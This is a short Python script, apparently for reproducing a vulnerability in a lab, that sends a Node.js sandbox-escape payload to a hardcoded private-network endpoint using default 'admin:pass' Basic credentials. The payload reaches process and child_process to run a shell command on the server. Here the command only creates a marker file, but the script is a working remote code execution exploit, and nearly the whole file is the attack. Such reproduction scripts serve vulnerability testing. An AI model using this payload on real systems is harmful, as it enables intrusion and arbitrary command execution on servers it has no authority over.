import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


def execute():
    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Authorization": "Basic YWRtaW46cGFzcw==",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = """document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")"""
    res = requests.post(
        f"http://192.168.123.3:8081/checkValid", headers=headers, data=payload
    )
    print(res.text)


all_time = 5
sleep_time = all_time // 2

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)

execute()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
